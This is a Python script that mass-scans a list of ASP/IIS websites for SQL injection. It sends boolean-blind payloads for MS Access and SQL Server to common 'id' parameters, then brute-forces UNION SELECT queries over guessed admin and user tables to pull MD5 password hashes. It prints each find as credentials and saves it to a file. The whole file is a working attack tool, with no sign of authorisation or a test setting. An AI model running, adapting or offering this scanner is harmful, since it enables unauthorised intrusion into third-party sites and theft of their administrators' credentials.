#!/usr/bin/env python3
"""Fast focused SQLi scanner - key params only"""
import json, subprocess, re, sys, time
from concurrent.futures import ThreadPoolExecutor, as_completed

# Only key parameters that are most likely to have SQLi
PARAMS = ['news.asp?id=', 'product.asp?id=', 'show.asp?id=', 'about.asp?id=',
          'class.asp?id=', 'detail.asp?id=', 'info.asp?id=', 'list.asp?id=',
          'content.asp?id=', 'view.asp?id=', 'display.asp?id=']

TIMEOUT = 8

def curl(url, timeout=TIMEOUT):
    try:
        r = subprocess.run(['curl', '-s', '-m', str(timeout), '-k', '-L',
            '--max-redirs', '1', '-o', '/dev/null', '-w', '%{http_code}:%{size_download}',
            '-H', 'User-Agent: Mozilla/5.0 (compatible; MSIE 9.0)', url],
            capture_output=True, text=True, timeout=timeout+3)
        parts = r.stdout.strip().split(':')
        code = int(parts[0]) if parts[0].isdigit() else 0
        size = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 0
        return code, size
    except:
        return 0, 0

def curl_body(url, timeout=TIMEOUT):
    try:
        r = subprocess.run(['curl', '-s', '-m', str(timeout), '-k', '-L',
            '--max-redirs', '1',
            '-H', 'User-Agent: Mozilla/5.0 (compatible; MSIE 9.0)', url],
            capture_output=True, text=True, timeout=timeout+3)
        return r.stdout
    except:
        return ''

def test_sqli_site(site):
    """Test a single site for SQLi on all params"""
    domain = site['domain']
    server = site['server']
    findings = []
    
    for proto in ['http', 'https']:
        base = f"{proto}://{domain}"
        
        for param in PARAMS:
            # Quick live check
            code, size = curl(f"{base}/{param}1")
            if code != 200 or size < 200:
                continue
            
            # Get baseline body
            url_norm = f"{base}/{param}1"
            body_norm = curl_body(url_norm)
            if not body_norm or len(body_norm) < 200:
                continue
            
            # Test MS Access boolean blind: IIF(1=1,1,0)=1 (true) vs IIF(1=2,1,0)=1 (false)
            # True condition - should return same as normal
            code_t, size_t = curl(f"{base}/{param}1 AND IIF(1=1,1,0)=1")
            # False condition - should return different
            code_f, size_f = curl(f"{base}/{param}1 AND IIF(1=2,1,0)=1")
            
            if code_t == 200 and code_f == 200:
                if size_t > 0 and size_f > 0:
                    # True should be similar to normal, false should be different
                    size_diff_t = abs(size_t - size)
                    size_diff_f = abs(size_f - size)
                    
                    if size_diff_t < 50 and size_diff_f > 100:
                        print(f"  [!] ACCESS SQLi: {domain} {param} (sizes: norm={size}, true={size_t}, false={size_f})")
                        
                        # Try union select to extract admin credentials
                        creds = try_union_extract(base, param)
                        findings.append({
                            'domain': domain, 'server': server,
                            'url': f"{base}/{param}",
                            'db_type': 'access', 'sqli_type': 'boolean_blind_iif',
                            'credentials': creds
                        })
                        return findings  # One finding per site is enough
            
            # Test SQL Server: 1=1 vs 1=2
            code_t2, size_t2 = curl(f"{base}/{param}1 AND 1=1")
            code_f2, size_f2 = curl(f"{base}/{param}1 AND 1=2")
            
            if code_t2 == 200 and code_f2 == 200:
                if size_t2 > 0 and size_f2 > 0:
                    size_diff_t2 = abs(size_t2 - size)
                    size_diff_f2 = abs(size_f2 - size)
                    
                    if size_diff_t2 < 50 and size_diff_f2 > 100:
                        print(f"  [!] MSSQL SQLi: {domain} {param} (sizes: norm={size}, true={size_t2}, false={size_f2})")
                        
                        creds = try_union_extract(base, param, db='mssql')
                        findings.append({
                            'domain': domain, 'server': server,
                            'url': f"{base}/{param}",
                            'db_type': 'mssql', 'sqli_type': 'boolean_blind_1=1',
                            'credentials': creds
                        })
                        return findings
            
            # Try url-encoded versions
            code_t3, size_t3 = curl(f"{base}/{param}1%20AND%20IIF(1%3D1%2C1%2C0)%3D1")
            code_f3, size_f3 = curl(f"{base}/{param}1%20AND%20IIF(1%3D2%2C1%2C0)%3D1")
            
            if code_t3 == 200 and code_f3 == 200:
                if size_t3 > 0 and size_f3 > 0:
                    size_diff_t3 = abs(size_t3 - size)
                    size_diff_f3 = abs(size_f3 - size)
                    
                    if size_diff_t3 < 50 and size_diff_f3 > 100:
                        print(f"  [!] ACCESS SQLi (encoded): {domain} {param}")
                        creds = try_union_extract(base, param)
                        findings.append({
                            'domain': domain, 'server': server,
                            'url': f"{base}/{param}",
                            'db_type': 'access', 'sqli_type': 'boolean_blind_iif_encoded',
                            'credentials': creds
                        })
                        return findings
    
    return findings


def try_union_extract(base_url, param, db='access'):
    """Try UNION SELECT to extract admin credentials"""
    base = base_url.rstrip('/')
    results = []
    
    tables = ['admin', 'Admin', 'users', 'Users', 'manager', 'Manager', 'user', 'User',
              'system', 'config', 'manage', 'guanliyuan']
    
    col_pairs = [
        ('username', 'password'), ('username', 'passwd'), ('user', 'pass'),
        ('admin', 'password'), ('name', 'pass'), ('userid', 'pwd'),
        ('uname', 'upass'), ('loginname', 'loginpass'), ('adminname', 'adminpass'),
        ('uname', 'pwd'), ('uid', 'pwd'), ('user_name', 'user_pass'),
    ]
    
    for col_cnt in range(3, 15):
        cols = ','.join(str(i) for i in range(1, col_cnt + 1))
        cols_rest = ','.join(str(i) for i in range(3, col_cnt + 1))
        if not cols_rest:
            continue
            
        for table in tables:
            for ucol, pcol in col_pairs:
                payload = f"{param}1 UNION SELECT {ucol},{pcol},{cols_rest} FROM {table}"
                url = f"{base}/{payload}"
                body = curl_body(url, timeout=10)
                
                if body and len(body) > 100:
                    # Look for MD5 hashes in the response
                    md5_32 = re.findall(r'\b([a-fA-F0-9]{32})\b', body)
                    md5_16 = re.findall(r'\b([a-fA-F0-9]{16})\b', body)
                    
                    if md5_32 or md5_16:
                        # Extract username + hash pairs from the response text
                        # Strip HTML tags
                        clean = re.sub(r'<[^>]+>', ' ', body)
                        clean = re.sub(r'\s+', ' ', clean)
                        
                        for h in md5_32 + md5_16:
                            idx = clean.find(h)
                            if idx > 0:
                                # Get surrounding text
                                start = max(0, idx - 100)
                                end = min(len(clean), idx + 100)
                                context = clean[start:end].strip()
                                
                                results.append({
                                    'table': table,
                                    'username_col': ucol,
                                    'password_col': pcol,
                                    'hash': h,
                                    'hash_type': 'md5_32' if len(h) == 32 else 'md5_16',
                                    'context': context[:200]
                                })
                                return results  # Got results, stop trying
    
    return results


def main():
    with open('/tmp/asp_sites.json') as f:
        sites = json.load(f)
    
    print(f"Starting focused SQLi scan on {len(sites)} ASP/IIS sites...")
    print(f"Testing params: {PARAMS}")
    
    all_findings = []
    
    for i, site in enumerate(sites):
        domain = site['domain']
        print(f"\n[{i+1}/{len(sites)}] {domain} ({site['server']})")
        try:
            findings = test_sqli_site(site)
            if findings:
                all_findings.extend(findings)
                for f in findings:
                    print(f"  >>> VULNERABLE! {f['db_type']} - {f['url']}")
                    if f.get('credentials'):
                        for c in f['credentials']:
                            print(f"  >>> CREDS: {c}")
        except Exception as e:
            print(f"  Error: {e}")
    
    # Save results
    with open('/tmp/sqli_findings.json', 'w') as f:
        json.dump(all_findings, f, ensure_ascii=False, indent=2)
    
    print(f"\n{'='*70}")
    print(f"SCAN COMPLETE: {len(all_findings)} vulnerable sites found")
    print(f"Results saved to /tmp/sqli_findings.json")
    
    # Summary
    if all_findings:
        print(f"\n--- VULNERABLE SITES SUMMARY ---")
        for f in all_findings:
            creds_str = ""
            if f.get('credentials'):
                for c in f['credentials']:
                    creds_str += f"\n      Username col: {c['username_col']}, Hash: {c['hash'][:32]}..."
            print(f"  {f['domain']} | {f['db_type']} | {f['sqli_type']} | {f['url']}{creds_str}")

if __name__ == '__main__':
    main()
